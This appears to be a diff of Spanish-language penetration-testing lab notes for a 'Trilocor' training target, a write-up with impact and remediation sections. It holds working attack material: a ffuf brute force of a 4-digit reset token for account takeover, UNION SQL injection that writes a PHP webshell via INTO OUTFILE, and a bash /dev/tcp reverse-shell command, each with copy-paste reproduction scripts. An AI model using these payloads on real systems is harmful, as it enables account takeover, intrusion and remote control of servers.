@@ -1,6 +1,6 @@
 [[CWES]] [[Web Enumeración]] [[Web Explotación]] [[CWES - Checklist]]
 
-# Trilocor
+# Trilocor (80)
 ## ip y hosts
 
 IP: 
@@ -285,7 +285,7 @@ Compromiso total del servidor web. Un usuario con privilegios mínimos de edici�
 - Patchstack — _Critical Vulnerability in Elementor Affecting 5+ Million Websites_
 - Investigador original: Hồng Quân (2023-12-06)
 
-# Recursos Humanos
+# Trilocor HR (8088)
 
 ## Finding — Authentication Bypass vía SQL Injection (HR Dashboard)
 
@@ -675,3 +675,331 @@ curl -s -b "$C" -X POST "$T/dashboard.php" \
   --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
   --data-urlencode 'cmd=id' | grep -a 'uid='
 ```
+
+# Trilocor Jobs Portal (8080)
+
+### Finding — Account Takeover vía Brute Force del Reset Token (Portal 8080)
+
+**Target:** Trilocor — Portal de empleados **Host:** `trilocor.local` (`10.129.247.239`) — puerto `8080/tcp` (PHP) **Endpoints:** `/register.php`, `/login.php`, `/forgot.php`, `/reset.php` **Tipo:** User enumeration + Insecure Password Reset (token débil sin rate limiting) → Account Takeover **Severidad:** Alta **Cuenta comprometida:** `r.batty`
+
+---
+
+### 1. Resumen
+
+El flujo de recuperación de contraseña genera un **token de reset de solo 4 dígitos numéricos** (espacio de 10 000 valores) y no aplica throttling ni bloqueo sobre `reset.php`. Combinado con un defecto de **enumeración de usuarios** (mensajes de login distintos para usuarios válidos vs. inválidos), un atacante puede:
+
+1. Descubrir un nombre real expuesto en la aplicación.
+2. Derivar el username válido (`r.batty`) por enumeración.
+3. Disparar un reset y forzar el token de 4 dígitos por fuerza bruta.
+4. Fijar una contraseña nueva y tomar control de la cuenta.
+
+---
+
+### 2. Reconocimiento — origen del nombre
+
+Tras registrar una cuenta propia en `/register.php` y autenticarse, la aplicación expone un nombre real de empleado en el portal: **Roy Batty**.
+
+---
+
+### 3. Enumeración de usuarios
+
+#### 3.1 — Generar candidatos de username
+
+A partir del nombre real, se generan variantes de username con `username-anarchy`:
+
+```bash
+./username-anarchy Roy Batty > Roy_Batty_usernames.txt
+```
+
+#### 3.2 — Oráculo de enumeración en el login
+
+El login devuelve **mensajes distintos** según si el usuario existe o no (defecto de diseño que permite enumerar). Probando la lista contra `/login.php` se identifica el único username válido:
+
+```
+r.batty   -> mensaje correspondiente a usuario EXISTENTE
+```
+
+> Causa del oráculo: la aplicación distingue "usuario inexistente" de "contraseña incorrecta" en la respuesta, revelando qué cuentas existen.
+
+---
+
+### 4. Flujo de reset y análisis del token
+
+#### 4.1 — Disparar el reset
+
+En `/forgot.php` se solicita el reset para `r.batty`, lo que habilita `/reset.php?username=r.batty`.
+
+#### 4.2 — Caracterizar el token (clave del ataque)
+
+Inspeccionando el formulario de `reset.php`:
+
+```bash
+curl -s "http://trilocor.local:8080/reset.php?username=r.batty" \
+  -H 'Cookie: PHPSESSID=<SID>' | grep -iE 'token|maxlength'
+```
+
+```html
+<input type="text" name="token" maxlength="4" placeholder="Token">
+<label>4 Digit Reset Token</label>
+```
+
+**Token = 4 dígitos numéricos → 10 000 combinaciones.** Fuerza bruta trivial.
+
+#### 4.3 — Oráculo de error
+
+Un token inválido devuelve un mensaje identificable, usado luego como filtro:
+
+```bash
+curl -s -X POST "http://trilocor.local:8080/reset.php" \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: PHPSESSID=<SID>' \
+  -d 'username=r.batty&token=9999&password=Newpass123!&pass_conf=Newpass123!' \
+  | grep -i 'token'
+# -> <strong>Error!</strong> <span>Invalid Token.</span>
+```
+
+Oráculo de fallo: la cadena **`Invalid Token`**.
+
+---
+
+### 5. Explotación — Brute force del token
+
+#### 5.1 — Wordlist de PINs (con padding de ceros)
+
+```bash
+seq -w 0 9999 > /tmp/pins.txt
+wc -l /tmp/pins.txt    # 10000
+```
+
+#### 5.2 — ffuf filtrando el mensaje de error
+
+```bash
+ffuf -t 3 -rate 8 -p 0.2-0.6 \
+  -u "http://trilocor.local:8080/reset.php" \
+  -X POST \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: PHPSESSID=<SID>' \
+  -d 'username=r.batty&token=FUZZ&password=Newpass123!&pass_conf=Newpass123!' \
+  -w /tmp/pins.txt \
+  -fr 'Invalid Token'
+```
+
+El `-fr 'Invalid Token'` descarta todos los intentos fallidos. El único token que **no** matchee ese patrón es el válido y aparece aislado en la salida.
+
+**Consideraciones operativas (lecciones de esta máquina):**
+
+- **Rate bajo obligatorio.** El target banea con volumen. `-t 3 -rate 8`. Verificar en el banner de ffuf que `Threads: 3` (el orden de los flags importa; si `-t` va después, puede quedar en el default 40).
+- **El token está atado a la PHPSESSID** del `forgot.php`. Usar esa misma cookie y que no expire durante el fuzz. Si la corrida entera da "Invalid Token" sin un solo hit, el token caducó: regenerar `forgot.php` → nueva sesión → reintentar.
+- **Wordlist con padding.** `seq -w` produce `0000`, no `0`, acorde al `maxlength="4"`.
+- **Filtrar por el span exacto** (`Invalid Token`), no por "Error": el template contiene siempre `<strong>Error!</strong>`, así que filtrar por "Error" descartaría también el acierto.
+
+#### 5.3 — Fijar la contraseña
+
+Con el token válido, se repite el POST para establecer la nueva contraseña:
+
+```bash
+curl -s -X POST "http://trilocor.local:8080/reset.php" \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: PHPSESSID=<SID>' \
+  -d 'username=r.batty&token=<TOKEN_VALIDO>&password=Newpass123!&pass_conf=Newpass123!'
+```
+
+Luego se inicia sesión en `/login.php` como `r.batty` / `Newpass123!`. Account takeover completo; la flag del nivel queda accesible dentro de la cuenta.
+
+---
+
+### 6. Impacto
+
+- Toma de control de cualquier cuenta cuyo username pueda enumerarse.
+- El token de 4 dígitos sin throttling reduce el reset a ~10 000 intentos (minutos).
+- Encadenable: enumeración de nombres reales → derivación de username → reset → takeover, sin credenciales previas legítimas.
+
+---
+
+### 7. Remediación
+
+1. **Tokens de reset fuertes.** Mínimo 32 caracteres aleatorios criptográficamente seguros (`random_bytes`), de un solo uso y con expiración corta. Nunca PINs de 4 dígitos.
+2. **Rate limiting / lockout en `reset.php`.** Limitar intentos por sesión, por cuenta y por IP; bloquear o introducir backoff tras pocos fallos.
+3. **Invalidar el token** tras un número reducido de intentos fallidos y exigir un nuevo `forgot.php`.
+4. **Eliminar la enumeración de usuarios.** Mensajes genéricos e idénticos en `login.php` y `forgot.php` independientemente de si la cuenta existe.
+5. **No exponer datos personales** (nombres de empleados) a usuarios no privilegiados, para no alimentar la generación de usernames.
+
+---
+
+### 8. Apéndice — Reproducción (copy/paste)
+
+```bash
+T="http://trilocor.local:8080"
+SID="<PHPSESSID del forgot.php>"
+
+# 1) Confirmar largo del token
+curl -s "$T/reset.php?username=r.batty" -H "Cookie: PHPSESSID=$SID" \
+  | grep -iE 'token|maxlength'
+
+# 2) Confirmar oráculo de error
+curl -s -X POST "$T/reset.php" \
+  -H 'Content-Type: application/x-www-form-urlencoded' -H "Cookie: PHPSESSID=$SID" \
+  -d 'username=r.batty&token=9999&password=Newpass123!&pass_conf=Newpass123!' \
+  | grep -i 'token'
+
+# 3) Brute force
+seq -w 0 9999 > /tmp/pins.txt
+ffuf -t 3 -rate 8 -p 0.2-0.6 \
+  -u "$T/reset.php" -X POST \
+  -H 'Content-Type: application/x-www-form-urlencoded' -H "Cookie: PHPSESSID=$SID" \
+  -d 'username=r.batty&token=FUZZ&password=Newpass123!&pass_conf=Newpass123!' \
+  -w /tmp/pins.txt -fr 'Invalid Token'
+
+# 4) Fijar password con el token hallado y loguear
+curl -s -X POST "$T/reset.php" \
+  -H 'Content-Type: application/x-www-form-urlencoded' -H "Cookie: PHPSESSID=$SID" \
+  -d 'username=r.batty&token=<TOKEN>&password=Newpass123!&pass_conf=Newpass123!'
+```
+
+## Finding — SQL Injection (UNION) → RCE vía INTO OUTFILE (Portal 8080)
+
+**Target:** Trilocor — Portal de empleados **Host:** `trilocor.local` (`10.129.247.239`) — puerto `8080/tcp` (PHP + MySQL) **Endpoint:** `/resumes.php` **Parámetro vulnerable:** `search` (POST) **Tipo:** SQL Injection (UNION-based) → escritura de archivo vía `INTO OUTFILE` → RCE **Severidad:** Crítica **Contexto de ejecución obtenido:** `uid=100(apache)` (dentro de contenedor) **Precondición:** Sesión autenticada en el portal (ver finding previo: Account Takeover)
+
+---
+
+### 1. Resumen
+
+El campo de búsqueda de `resumes.php` concatena la entrada del usuario directamente en una consulta SQL, permitiendo inyección **UNION-based**. La cuenta de base de datos posee el privilegio `FILE` y `secure_file_priv` está configurado de forma permisiva, lo que permite usar `INTO OUTFILE` para **escribir archivos arbitrarios en el webroot**. Escribiendo un webshell PHP se obtiene ejecución remota de comandos como el usuario `apache`.
+
+---
+
+### 2. Identificación de la inyección
+
+El parámetro `search` se envía por POST. Una comilla simple rompe la consulta, confirmando la inyección. Con `ORDER BY` / `UNION SELECT` incremental se determina el número de columnas.
+
+#### 2.1 — Número de columnas: 6
+
+```
+POST /resumes.php
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=<SID>
+
+search=test' UNION select 1,2,3,4,5,6-- -
+```
+
+La respuesta refleja los valores numéricos de las columnas en la tabla de resultados, confirmando **6 columnas** y qué posiciones son visibles en la salida (útil para ubicar el payload en una columna reflejada).
+
+---
+
+### 3. Confirmar capacidad de escritura (INTO OUTFILE)
+
+Antes del webshell, se valida que `INTO OUTFILE` funciona escribiendo un archivo de prueba en el webroot:
+
+```
+search=test' UNION select 1,2,3,'file written successfully',5,6 into outfile '/var/www/public/proof.txt'-- -
+```
+
+```bash
+curl -s "http://trilocor.local:8080/proof.txt"
+# -> file written successfully
+```
+
+Esto confirma las tres condiciones necesarias:
+
+- privilegio `FILE` en la cuenta MySQL,
+- `secure_file_priv` vacío o apuntando a una ruta utilizable,
+- webroot (`/var/www/public/`) escribible por el usuario de MySQL.
+
+---
+
+### 4. Explotación — escribir webshell y RCE
+
+#### 4.1 — Escribir el webshell
+
+```
+search=test' UNION select 1,2,3,'<?php system($_REQUEST["cmd"]); ?>',5,6 into outfile '/var/www/public/web-shell.php'-- -
+```
+
+> Nota: usar `$_REQUEST['cmd']` **con comillas**. Sin comillas (`$_REQUEST[cmd]`) PHP lo interpreta como constante indefinida: genera un `Warning` en PHP 7 (funciona igual) pero es **error fatal en PHP 8** (la shell deja de ejecutar). Las comillas evitan ese problema.
+
+#### 4.2 — Ejecutar comandos
+
+```bash
+curl -s "http://trilocor.local:8080/web-shell.php?cmd=id" \
+  -H 'Cookie: PHPSESSID=<SID>'
+# -> uid=100(apache) gid=101(apache) groups=82(www-data),101(apache)
+```
+
+RCE confirmado como `apache`. Ejemplos:
+
+```bash
+curl -s "http://trilocor.local:8080/web-shell.php?cmd=ls+/"   -H 'Cookie: PHPSESSID=<SID>'
+curl -s "http://trilocor.local:8080/web-shell.php?cmd=cat+/ruta/archivo" -H 'Cookie: PHPSESSID=<SID>'
+```
+
+> El output del webshell aparece embebido en la tabla de `resumes.php` (las columnas 1,2,3,...,5,6 rodean la salida del comando en la columna 4). Filtrar visualmente o con `grep` la línea relevante.
+
+---
+
+### 5. Observaciones del entorno
+
+- El usuario es `apache` (uid 100), distinto del RCE del host 8088 (`www-data`): **son contextos/contenedores separados.**
+- La presencia de `entry.sh` en `/` y un filesystem minimalista indican ejecución **dentro de un contenedor**, dato relevante para la fase de post-explotación y escalada.
+
+---
+
+### 6. Shell interactiva (opcional)
+
+```bash
+# Listener local
+nc -lvnp 4444
+
+curl -s "http://trilocor.local:8080/web-shell.php" \
+  -H 'Cookie: PHPSESSID=<SID>' \
+  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/TU_IP/4444 0>&1"'
+```
+
+Estabilizar: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg`.
+
+---
+
+### 7. Impacto
+
+- Lectura/escritura de archivos arbitrarios en el servidor vía SQLi (`INTO OUTFILE`, `LOAD_FILE`).
+- Ejecución remota de comandos como `apache` dentro del contenedor.
+- Punto de pivote para enumeración interna y escalada de privilegios.
+- Compromiso completo de la base de datos del portal.
+
+---
+
+### 8. Remediación
+
+1. **Consultas parametrizadas / prepared statements** en `resumes.php`. Corrección de fondo: elimina la inyección.
+2. **Revocar el privilegio `FILE`** de la cuenta MySQL de la aplicación. Una app web casi nunca lo necesita.
+3. **Configurar `secure_file_priv`** a un directorio aislado (o deshabilitar la escritura a disco), nunca al webroot.
+4. **Webroot de solo lectura** para el usuario de MySQL; separar la cuenta de BD de la app de cualquier capacidad de escritura en disco.
+5. **Cuenta de BD con privilegios mínimos** (solo SELECT/INSERT/UPDATE sobre las tablas necesarias).
+6. Defensa en profundidad: WAF y monitoreo de archivos nuevos en el webroot.
+
+---
+
+### 9. Apéndice — Reproducción (copy/paste)
+
+```bash
+T="http://trilocor.local:8080"
+SID="<PHPSESSID autenticada>"
+
+# 1) Confirmar columnas (6)
+curl -s -X POST "$T/resumes.php" -H "Cookie: PHPSESSID=$SID" \
+  --data-urlencode "search=test' UNION select 1,2,3,4,5,6-- -"
+
+# 2) Confirmar INTO OUTFILE
+curl -s -X POST "$T/resumes.php" -H "Cookie: PHPSESSID=$SID" \
+  --data-urlencode "search=test' UNION select 1,2,3,'file written successfully',5,6 into outfile '/var/www/public/proof.txt'-- -"
+curl -s "$T/proof.txt"
+
+# 3) Escribir webshell
+curl -s -X POST "$T/resumes.php" -H "Cookie: PHPSESSID=$SID" \
+  --data-urlencode "search=test' UNION select 1,2,3,'<?php system(\$_REQUEST[\"cmd\"]); ?>',5,6 into outfile '/var/www/public/web-shell.php'-- -"
+
+# 4) RCE
+curl -s "$T/web-shell.php?cmd=id" -H "Cookie: PHPSESSID=$SID"
+```
+
+# Trilocor PR Admin (8009)
+
